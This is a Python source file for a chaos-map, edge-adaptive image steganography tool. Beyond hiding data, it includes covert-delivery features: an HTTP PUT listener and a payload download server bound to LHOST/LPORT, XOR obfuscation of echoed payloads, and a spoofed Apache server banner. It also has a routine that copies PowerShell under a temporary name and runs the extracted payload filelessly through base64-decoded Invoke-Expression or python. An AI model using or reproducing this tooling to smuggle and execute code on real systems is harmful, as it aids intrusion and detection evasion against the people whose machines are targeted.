#!/usr/bin/env python
# coding:UTF-8
import argparse
import base64
import hashlib
import http.server
import math
import os
import re
import shutil
import socketserver
import subprocess
import sys
import tempfile
from collections import Counter

import cv2
import numpy as np
from mpmath import mp
from tqdm import tqdm

from ansi import *


class SteganographyError(Exception):
    pass


class ChaosEdgeSteg:
    def __init__(self, key, image_path, output_path=None, save_bitmaps=False, verbose=False, debug=False, quiet=False):
        self.verbose = verbose
        self.debug = debug
        self.quiet = quiet
        self.gray_img = None
        self.edge_map = None
        self.save_bitmaps = save_bitmaps
        self.len_flag, actual_key = key.split('::', 1)
        self.key = actual_key
        self.payload_length = int(self.len_flag, 16)
        self.image_path = image_path
        if output_path:
            self.output_dir = os.path.dirname(output_path)
        else:
            self.output_dir = os.getcwd()
        self.image = cv2.imread(image_path)
        self.a, self.b = self._get_henon_params(actual_key)
        self.henon_x, self.henon_y = self._get_henon_map()
        self.edges = self._get_edges(self.image)
        self.edge_coords = self._map_trajectory_to_edges()

    def _print_msg(self, message, msg_type='regular'):
        if self.quiet and msg_type != 'debug':
            return
        if msg_type == 'debug' and self.debug:
            print(f'[*] {message}')
        elif msg_type == 'verbose' and self.verbose:
            print(f'[*] {message}')
        elif msg_type == 'regular':
            print(f'[{Fore.RED}*{Fore.RESET}] {message}')

    @staticmethod
    def _sha256_hashgen(data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        return hashlib.sha256(data).hexdigest()

    def _save_bitmap(self, bitmap_name, image):
        if self.save_bitmaps:
            directory = self.output_dir
            bitmaps_dir = os.path.join(directory, 'bitmaps')
            if not os.path.exists(bitmaps_dir):
                os.makedirs(bitmaps_dir)
            bitmap_path = os.path.join(bitmaps_dir, bitmap_name)
            cv2.imwrite(bitmap_path, image)

    @staticmethod
    def _data_to_bin(data):
        if isinstance(data, str):
            return ''.join(format(ord(i), '08b') for i in data)
        elif isinstance(data, bytes):
            return ''.join(format(byte, '08b') for byte in data)

    @staticmethod
    def _get_entropy(key):
        char_count = Counter(key)
        total_chars = len(key)
        entropy = 0
        for char, count in char_count.items():
            prob = count / total_chars
            entropy -= prob * math.log2(prob)
        return entropy

    def _get_thresholds(self, image):
        self._print_msg('Calculating adaptive thresholds...', msg_type='verbose')
        base_lower = 45
        base_upper = 135
        min_lower = 85
        min_upper = 255
        filtered_img = cv2.bilateralFilter(image, d=9, sigmaColor=75, sigmaSpace=75)
        norm_payload_size = self.payload_length / (filtered_img.shape[0] * filtered_img.shape[1])
        self._print_msg(f'Normalized payload size: {norm_payload_size}', msg_type='debug')
        standard_edge_map = cv2.Canny(filtered_img, base_lower, base_upper)
        edge_density = cv2.countNonZero(standard_edge_map) / (filtered_img.shape[0] * filtered_img.shape[1])
        self._print_msg(f'Edge density: {edge_density}', msg_type='debug')
        payload_influence = norm_payload_size * 100
        self._print_msg(f'Payload influence: {payload_influence}', msg_type='debug')
        if 2 <= payload_influence < 2.5:
            import warnings
            warnings.warn(
                'Payload size approaching limit for the given cover image', Warning)
        elif payload_influence >= 2.5:
            raise SteganographyError(
                'Payload is too large for the given cover image')
        combined_density = edge_density + payload_influence
        threshold_scale = 1 - combined_density  # Scale the thresholds towards min values
        _lower = int(base_lower + threshold_scale * (min_lower - base_lower))
        _upper = int(base_upper + threshold_scale * (min_upper - base_upper))
        self._print_msg(f'Thresholds after combined density adjustment: {_lower, _upper}', msg_type='debug')
        return _lower, _upper

    def _get_edges(self, image):
        gray_img = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
        self.gray_img = gray_img
        lower_threshold, upper_threshold = self._get_thresholds(image)
        edge_map = cv2.Canny(gray_img, lower_threshold, upper_threshold)
        self._save_bitmap('edge_map.png', edge_map)
        self.edge_map = edge_map
        edge_coordinates = np.column_stack(np.where(edge_map))
        return edge_coordinates

    def _get_henon_map(self):
        mp.dps = 50
        x, y = [mp.mpf('0.1')], [mp.mpf('0.1')]
        a, b = mp.mpf(self.a), mp.mpf(self.b)
        for i in range(self.payload_length * 8):
            next_x = y[-1] + mp.mpf('1.0') - a * x[-1] ** 2
            next_y = b * x[-1]
            x.append(next_x)
            y.append(next_y)
        x = [float(val) for val in x]
        y = [float(val) for val in y]
        return x, y

    def _get_henon_params(self, key):
        self._print_msg('Generating Henon parameters from key...', msg_type='verbose')
        entropy = self._get_entropy(key)
        self._print_msg(f'Key entropy: {entropy}', msg_type='debug')
        a = 1.4 - (0.2 * (entropy / 8))
        b = 0.3 + (0.1 * (entropy / 8))
        self._print_msg(f'Parameter a: {a}', msg_type='debug')
        self._print_msg(f'Parameter b: {b}', msg_type='debug')
        return a, b

    def _map_trajectory_to_edges(self):
        self._print_msg('Detecting edges...', msg_type='verbose')
        edge_coords = self.edges
        if len(edge_coords) == 0:
            raise SteganographyError(
                'No edge coordinates detected')
        henon_map = np.column_stack((self.henon_x, self.henon_y))
        norm_indices = (henon_map - henon_map.min()) / (henon_map.max() - henon_map.min())
        norm_indices *= (len(edge_coords) - 1)
        norm_indices = norm_indices.astype(int)
        self._print_msg(f'Payload length: {self.payload_length}', msg_type='debug')
        self._print_msg(f'Available indices: {str(len(norm_indices))}', msg_type='debug')
        self._print_msg('Mapping chaotic trajectory to edge coordinates...')
        available_edge_mask = np.ones(len(edge_coords), dtype=bool)
        final_edge_coords = []
        for index in tqdm(
                norm_indices[:, 0], total=len(norm_indices), disable=self.quiet,
                bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]', ascii='.#', leave=False):
            original_index = index  # Store original index to check for full loop without available edge
            while not available_edge_mask[index]:
                index = (index + 1) % len(edge_coords)
                if index == original_index:  # Raise error if no available edges found after full loop
                    raise SteganographyError(
                        'Exhausted all available edge coordinates: Payload is too large for the input image')
            final_edge_coords.append(edge_coords[index])
            available_edge_mask[index] = False
        final_edge_coords = np.array(final_edge_coords)
        edge_map = np.zeros_like(self.gray_img)
        edge_map[final_edge_coords[:, 0], final_edge_coords[:, 1]] = 255
        self._save_bitmap('selected_edge_map.png', edge_map)
        return final_edge_coords

    def embed(self, img_path, payload):
        self._print_msg('Embedding payload...')
        bin_payload = self._data_to_bin(payload)
        s_key = self.len_flag + '::' + self.key
        key_hash = self._sha256_hashgen(s_key)
        bin_key_hash = bin(int(key_hash, 16))[2:].zfill(256)
        bin_payload = bin_key_hash + bin_payload
        bin_payload_length = len(bin_payload)
        img = cv2.imread(img_path)
        bin_idx = 0
        mod_channels = {}
        for coord in self.edge_coords:
            if bin_idx >= bin_payload_length:
                break
            y, x = coord
            coord_key = (x, y)
            channel = mod_channels.get(coord_key, 0)
            if channel > 2:
                continue
            img[y, x, channel] = (img[y, x, channel] & ~1) | int(bin_payload[bin_idx])
            mod_channels[coord_key] = channel + 1
            bin_idx += 1
        return img

    def extract(self, stego_img_path):
        if stego_img_path == self.image_path:
            raise SteganographyError(
                'Stego image is same as input image')
        self._print_msg('Extracting payload...')
        stego_img = cv2.imread(stego_img_path)
        edge_coords = np.column_stack(np.where(self.edge_map))
        x, y = self._get_henon_map()
        henon_map = np.column_stack((x, y))
        norm_indices = (henon_map - henon_map.min()) / (henon_map.max() - henon_map.min())
        norm_indices *= (len(edge_coords) - 1)
        norm_indices = norm_indices.astype(int)
        edge_mask = np.ones(len(edge_coords), dtype=bool)
        final_edge_coords = []
        for index in norm_indices[:, 0]:
            while not edge_mask[index]:
                index = (index + 1) % len(edge_coords)
            final_edge_coords.append(edge_coords[index])
            edge_mask[index] = False
        final_edge_coords = np.array(final_edge_coords)
        out_bits = []
        mod_channels = {}
        for coord in final_edge_coords[:self.payload_length * 8]:
            y, x = coord
            coord_key = (x, y)
            channel = mod_channels.get(coord_key, 0)
            if channel > 2:
                continue
            out_bit = stego_img[y, x, channel] & 1
            out_bits.append(str(out_bit))
            mod_channels[coord_key] = channel + 1
        out_str = ''.join(out_bits)
        out_bin_payload = int(out_str, 2).to_bytes((len(out_str) + 7) // 8, byteorder='big')
        out_bin_key_hash = out_bin_payload[:32]
        out_key_hash = out_bin_key_hash.hex()
        s_key = f'{self.len_flag}::{self.key}'.encode()
        in_key_hash = self._sha256_hashgen(s_key)
        self._print_msg(f'Extracted hash: {out_key_hash}', msg_type='debug')
        self._print_msg(f'Generated hash: {in_key_hash}', msg_type='debug')
        if out_key_hash != in_key_hash:
            raise SteganographyError(
                'Invalid key')
        extracted_payload = out_bin_payload[32:]
        return extracted_payload


class _PutHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    out_payload = None

    def __init__(self, *args, echo=False, quiet=False, obfuscate=False, steg_obj=None, filename=None, **kwargs):
        self.log_printed = False
        self.echo = echo
        self.quiet = quiet
        self.obfuscate = obfuscate
        self.steg_obj = steg_obj
        self.filename = filename
        super().__init__(*args, **kwargs)

    def _print_msg(self, message):
        if not self.quiet:
            print(f'[{Fore.CYAN}*{Fore.RESET}] {message}')

    def log_message(self, format, *args):
        if not self.log_printed:
            self._print_msg(f'Received {self.command} request from {self.client_address[0]}:{self.client_address[1]}')
            self.log_printed = True

    def version_string(self):
        return 'Apache/2.4.29 (Ubuntu)'

    def do_PUT(self):
        def xor_obf(data, values):
            for val in values:
                data = bytes([b ^ val for b in data])
            return data

        if not self.log_printed:
            self.log_message('Received %s request', self.command)
            self.log_printed = True
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        with open(self.filename, 'wb') as f:
            f.write(body)
        _PutHTTPRequestHandler.out_payload = self.steg_obj.extract(self.filename)
        if _PutHTTPRequestHandler.out_payload[:4] == b'PK\x03\x04':
            self.send_response(400)  # Bad Request
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            if self.echo:
                self.wfile.write(b'Error: ZIP archive detected.')
            else:
                self.wfile.write(b' ')
            self.server.stop = True
            return
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        if self.echo:
            if self.obfuscate:
                obf_payload = xor_obf(base64.b64encode(_PutHTTPRequestHandler.out_payload), [0x55, 0xFF])
                self.wfile.write(obf_payload)
            else:
                self.wfile.write(_PutHTTPRequestHandler.out_payload)
        else:
            self.wfile.write(b' ')
        self.server.stop = True


class _PayloadHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, quiet=False, filename=None, **kwargs):
        self.quiet = quiet
        self.log_printed = False
        self.filename = filename
        super().__init__(*args, **kwargs)

    def _print_msg(self, message):
        if not self.quiet:
            print(f'[{Fore.CYAN}*{Fore.RESET}] {message}')

    def log_message(self, format, *args):
        if not self.log_printed:
            self._print_msg(f'Received {self.command} request from {self.client_address[0]}:{self.client_address[1]}')
            self.log_printed = True

    def do_GET(self):
        if not self.log_printed:
            self.log_message('Received %s request', self.command)
            self.log_printed = True
        if self.path == '/' + self.filename:
            super().do_GET()
            self.server.stop = True


def _make_handler_class(quiet, filename, directory):
    class CustomHandler(_PayloadHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, quiet=quiet, filename=filename, directory=directory, **kwargs)


    return CustomHandler


def _start_http_put_server(args, steg, filename):
    echo_val = args.echo
    obf_val = args.obfuscate
    msg_prefix = f'[{Fore.CYAN}*{Fore.RESET}]' if not args.quiet else '#'
    handler = lambda *args: _PutHTTPRequestHandler(
        *args, echo=echo_val, obfuscate=obf_val, steg_obj=steg, filename=filename)
    httpd = socketserver.TCPServer((args.remote_stego_image[1], int(args.remote_stego_image[2])), handler)
    httpd.timeout = 1
    httpd.stop = False
    print(f'{msg_prefix} PUT server listening on http://{args.remote_stego_image[1]}:{args.remote_stego_image[2]}/')
    try:
        while not httpd.stop:
            httpd.handle_request()
        print(f'{msg_prefix} Connection closed')
    except KeyboardInterrupt:
        print(f'{msg_prefix} KeyboardInterrupt: Aborting...')
        httpd.server_close()
        exit(0)


def _handle_http_server(args, lhost, lport, handler_class):
    httpd = socketserver.TCPServer((lhost, lport), handler_class)
    httpd.timeout = 1
    httpd.stop = False
    msg_prefix = f'[{Fore.CYAN}*{Fore.RESET}]' if not args.quiet else '#'
    print(f'{msg_prefix} GET server listening on http://{lhost}:{lport}/{args.remote_output_file[0]}')
    try:
        while not httpd.stop:
            httpd.handle_request()
        print(f'{msg_prefix} Connection closed')
    except KeyboardInterrupt:
        print(f'{msg_prefix} KeyboardInterrupt: Connection closed')
        httpd.server_close()
        return


def _serve_http_payload(extracted_payload, args):
    if args.remote_output_file:
        output_file_path, lhost, lport = args.remote_output_file
        _save_payload(extracted_payload, output_file_path, is_binary=True)
        handler_class = _make_handler_class(args.quiet, output_file_path, os.getcwd())
        _handle_http_server(args, lhost, int(lport), handler_class)
        os.remove(output_file_path)
        exit(0)


def _save_payload(payload, output_file_path, is_binary=True):
    mode = 'wb' if is_binary else 'w'
    with open(output_file_path, mode) as file:
        file.write(payload)


def _exec_ps(extracted_text, suffix):
    if suffix not in ['pwsh', 'py']:
        return
    b64_script = base64.b64encode(extracted_text.encode('utf-8')).decode('utf-8')
    if shutil.which('PowerShell.exe'):
        ps_path = shutil.which('PowerShell.exe')
        tmp_ps_path = os.path.join(tempfile.gettempdir(), 'tmp_pwsh.exe')
        shutil.copy2(ps_path, tmp_ps_path)
        if suffix == 'pwsh':
            ps_cmd = f"""{tmp_ps_path} -noprofile -noninteractive Invoke-Expression \
                    \"$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64_script}')))\""""
        else:
            ps_cmd = f"""{tmp_ps_path} -noprofile -noninteractive -Command \
                    [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64_script}')) | python"""
        process = subprocess.Popen(ps_cmd, shell=True)
        process.communicate()
        os.remove(tmp_ps_path)
    elif shutil.which('pwsh'):
        ps_cmd = f"""pwsh -noprofile -noninteractive -Command \
                [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64_script}')) | python"""
        process = subprocess.Popen(ps_cmd, shell=True)
        process.communicate()
    else:
        raise ValueError(
            "'ps_execute': Unable to find 'PowerShell' or 'PowerShell Core' on this system")


def _handle_payload(extracted_payload, args):
    def _zip():
        output_file_path = args.output_file if args.output_file else 'extracted.zip'
        _save_payload(extracted_payload, output_file_path, is_binary=True)
        if not args.quiet:
            print(f"Extracted ZIP archive saved as '{output_file_path}'")

    def _text():
        extracted_text = extracted_payload.decode('utf-8', errors='replace')
        prefix = 'Obfuscated payload' if args.obfuscate else 'Payload'
        if not (args.quiet or args.echo) and not args.output_file:
            print('\nExtracted payload:\n')
        if args.echo:
            print(f'[{Fore.CYAN}*{Fore.RESET}] {prefix} echoed back to remote host')
        elif args.ps_execute:
            _exec_ps(extracted_text, args.ps_execute)
        else:
            print(f'{extracted_text}')
        if args.output_file:
            if os.path.splitext(args.output_file)[1] not in ['.txt', '.py']:
                output_file_path = os.path.splitext(args.output_file)[0] + '.txt'
            else:
                output_file_path = args.output_file
            _save_payload(extracted_text, output_file_path, is_binary=False)
            print(f"Extracted payload saved as '{output_file_path}'")

    _zip() if extracted_payload[:4] == b'PK\x03\x04' else _text()


def _embed(args):
    if args.payload and args.payload_file:
        raise ValueError(
            "Cannot use '-p' and '-f' simultaneously")
    if args.payload:
        if os.path.isfile(args.payload) and args.payload.endswith(('.txt', '.py', '.ps1')):
            with open(args.payload, 'rb') as file:
                payload = file.read()
                payload = payload.replace(b'\r\n', b'\n').replace(b'\r', b'\n')
        else:
            payload = args.payload.encode()
    elif args.payload_file:
        if not os.path.isfile(args.payload_file):
            raise FileNotFoundError(
                f"File does not exist: '{os.path.abspath(args.payload_file)}'")
        if not args.payload_file.endswith('.zip'):
            ValueError(
                "Invalid payload file type. Only '.zip' archives are supported")
        with open(args.payload_file, 'rb') as file:
            payload = file.read()
    else:
        raise ValueError(
            "Either '-p' or '-f' must be provided to specify the payload")
    payload_byte_length = len(payload.encode('utf-8')) if isinstance(payload, str) else len(payload)
    adjusted_length = payload_byte_length + 32
    hex_length = f'{adjusted_length:04X}'
    adjusted_key = f'{hex_length}::{args.key}'
    steg = ChaosEdgeSteg(
        adjusted_key, args.cover_image_path, args.output_image_path, args.save_bitmaps, args.verbose, args.debug,
        args.quiet)
    stego_image = steg.embed(args.cover_image_path, payload)
    if args.save_key:
        if args.output_image_path:
            _dir = os.path.dirname(args.output_image_path)
        else:
            _dir = os.getcwd()
            print('No output image path was specified. Saving key to the current directory')
        key_path = os.path.join(_dir, 'key.txt')
        with open(key_path, 'w') as file:
            file.write(adjusted_key)
        print(f"Key saved as '{key_path}'")
    elif not args.save_key:
        print(f"Key with hex length appended: '{adjusted_key}'") if not args.quiet else print(adjusted_key)
    if args.output_image_path:
        output_img_path = os.path.splitext(args.output_image_path)[0] + '.png'
    else:
        _dir = os.getcwd()
        output_img_path = os.path.join(
            _dir, f'stego_{os.path.splitext(os.path.basename(args.cover_image_path))[0]}.png')
    cv2.imwrite(output_img_path, stego_image)
    if not args.quiet:
        print(f"Stego image saved as '{output_img_path}'")


def _extract(args):
    def handle_remote():
        filename, lhost, lport = args.remote_stego_image
        if os.path.splitext(filename)[1] != '.png':
            raise ValueError(
                "Invalid file format for stego image: Only '.png' images are supported.")
        steg = ChaosEdgeSteg(args.key, args.cover_image_path, '', False, args.verbose, args.debug, args.quiet)
        _start_http_put_server(args, steg, filename)
        extracted_payload = _PutHTTPRequestHandler.out_payload if _PutHTTPRequestHandler.out_payload else steg.extract(
            filename)
        _handle_payload(extracted_payload, args)
        _serve_http_payload(extracted_payload, args)

    def handle_local():
        steg = ChaosEdgeSteg(args.key, args.cover_image_path, '', False, args.verbose, args.debug, args.quiet)
        extracted_payload = steg.extract(args.stego_image_path)
        _handle_payload(extracted_payload, args)
        _serve_http_payload(extracted_payload, args)

    if not re.match(r"^[0-9A-Fa-f]+::", args.key):
        raise ValueError(
            f"Unexpected key format: Does not match '[HEX_LENGTH]::[KEY]': '{args.key}'")
    if args.ps_execute and (args.echo or args.remote_output_file):
        raise ValueError(
            "'ps_execute': Cannot be used with remote options")
    if args.ps_execute and not args.quiet:
        args.quiet = True
    if args.echo and not args.remote_stego_image:
        raise ValueError(
            "'echo': Can only be used with 'remote_stego_image'")
    handle_remote() if args.remote_stego_image else handle_local()


def main_cli():
    parser = argparse.ArgumentParser(
        prog='python -m chaosedgesteg', description='ChaosEdgeSteg: A chaos-based edge adaptive steganography tool')
    subparsers = parser.add_subparsers()
    # Embed action arguments
    embed_parser = subparsers.add_parser('embed', help='Embed payload into an image')
    embed_parser.add_argument('-c', '--cover_image_path', required=True, help='Path to the cover image')
    embed_parser.add_argument(
        '-p', '--payload', type=str, help='Payload to embed directly into the image as a string. '
                                          f'Can also be a filepath (\'.txt\', \'.py\')')
    embed_parser.add_argument('-f', '--payload_file', type=str, help='Path to the payload file (\'.zip\' archive)')
    embed_parser.add_argument('-k', '--key', required=True, help='Key to use for embedding')
    embed_parser.add_argument(
        '-o', '--output_image_path', default=None,
        help='Path to save the output stego image. If not specified, defaults to '
             '\'stego_<cover_image_name>\'')
    embed_parser.add_argument(
        '--save_key', action='store_true', default=False, help='Save key as a text file in the '
                                                               'output directory')
    embed_parser.add_argument('--save_bitmaps', action='store_true', default=False, help='Save edge bitmaps')
    embed_parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Enable verbose output')
    embed_parser.add_argument('-vv', '--debug', action='store_true', default=False, help='Enable debug output')
    embed_parser.add_argument('-q', '--quiet', action='store_true', default=False, help='Suppress output messages')
    embed_parser.set_defaults(func=_embed)
    # Extract action arguments
    extract_parser = subparsers.add_parser('extract', help='Extract payload from a stego image')
    extract_parser.add_argument(
        '-c', '--cover_image_path', required=True, help='Path to the original cover image used during embedding')
    stego_image = extract_parser.add_mutually_exclusive_group(required=True)
    stego_image.add_argument(
        '-i', '--stego_image_path', type=str, help='Path to the stego image from which to extract the payload.')
    stego_image.add_argument(
        '-iR', '--remote_stego_image', nargs=3, metavar=('FILENAME', 'LHOST', 'LPORT'),
        help='Start HTTP PUT server to receive stego image')
    extract_parser.add_argument(
        '-k', '--key', required=True, help='Key used during embedding, with the payload length appended (e.g., '
                                           '\'0000::key\')')
    extract_output = extract_parser.add_mutually_exclusive_group()
    extract_output.add_argument(
        '-o', '--output_file', default=None, help='Path to save the extracted payload. If not specified, '
                                                  'the message is printed to the console')
    extract_output.add_argument(
        '-oR', '--remote_output_file', nargs=3, metavar=('FILENAME', 'LHOST', 'LPORT'),
        help='Save extracted payload and serve it for download.')
    echo_group = extract_parser.add_argument_group('Echo options', 'Options related to echoing back the payload')
    echo_group.add_argument(
        '--echo', action='store_true', default=False,
        help='Echo back responses to remote client. Only used with [-iR/--remote_stego_image]')
    obfuscate_group = echo_group.add_mutually_exclusive_group(required=False)
    obfuscate_group.add_argument(
        '--obfuscate', action='store_true', default=False, help='Obfuscate the echoed payload. Requires \'--echo\'')
    extract_parser.add_argument('--save_bitmaps', action='store_true', default=False, help='Save edge bitmaps')
    verbosity = extract_parser.add_mutually_exclusive_group()
    verbosity.add_argument('-v', '--verbose', action='store_true', default=False, help='Enable verbose output')
    verbosity.add_argument('-vv', '--debug', action='store_true', default=False, help='Enable debug output')
    extract_parser.add_argument('-q', '--quiet', action='store_true', default=False, help='Suppress output messages')
    extract_parser.add_argument(
        '-psx', '--ps_execute', type=str, default=False,
        help='Executes the extracted payload in a temp PowerShell instance. Valid params: ('
             '\'python\', \'pwsh\')')
    extract_parser.set_defaults(func=_extract)
    args = parser.parse_args()
    _header = header()
    if len(sys.argv) == 1:
        print(_header)
        parser.print_help()
        sys.exit(1)
    if not args.quiet:
        print(_header)
    args.func(args)
